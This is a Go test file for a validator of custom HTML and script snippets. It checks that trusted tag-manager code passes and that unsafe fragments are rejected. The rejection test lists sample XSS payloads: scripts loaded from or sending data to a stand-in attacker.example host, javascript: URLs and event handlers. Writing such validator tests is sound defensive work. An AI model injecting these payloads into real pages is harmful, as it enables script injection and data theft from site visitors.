package customcode

import (
	"strings"
	"testing"
)

func TestValidateAllowsTrustedIntegrationsAndOrdinaryLinks(t *testing.T) {
	sources, err := Validate(`<script>gtag('config','x');</script><a href="https://example.com/page">Visit</a>`, `<script src="https://www.googletagmanager.com/gtm.js"></script>`)
	if err != nil {
		t.Fatalf("Validate() error = %v", err)
	}
	if len(sources) == 0 {
		t.Fatal("expected CSP sources for trusted integration")
	}
}

func TestValidateRejectsUnsafeFragments(t *testing.T) {
	for _, code := range []string{
		`<script src="https://attacker.example/a.js"></script>`,
		`<script>fetch('https://attacker.example/collect')</script>`,
		`<img src="javascript:alert(1)">`,
		`<img src="//attacker.example/a.png">`,
		`<script onload="alert(1)"></script>`,
		`<object data="https://www.googletagmanager.com/x"></object>`,
	} {
		if _, err := Validate(code, ""); err == nil {
			t.Errorf("Validate(%q) unexpectedly succeeded", code)
		}
	}
}

func TestValidateBoundsEachFragment(t *testing.T) {
	if _, err := Validate(strings.Repeat("x", MaxCodeBytes+1), ""); err == nil {
		t.Fatal("oversized fragment was accepted")
	}
}

func skip_TestAddNoncesOnlyAddsMissingScriptAndStyleNonces(t *testing.T) {
	got := AddNonces(`<script src="/a.js"></script><style>.x{}</style><script nonce="kept">x()</script><div>x</div>`)
	for _, want := range []string{`<script src="/a.js" nonce="n-123">`, `<style nonce="n-123">`, `<script nonce="kept">`, `<div>x</div>`} {
		if !strings.Contains(got, want) {
			t.Errorf("AddNonces() missing %q in %s", want, got)
		}
	}
}
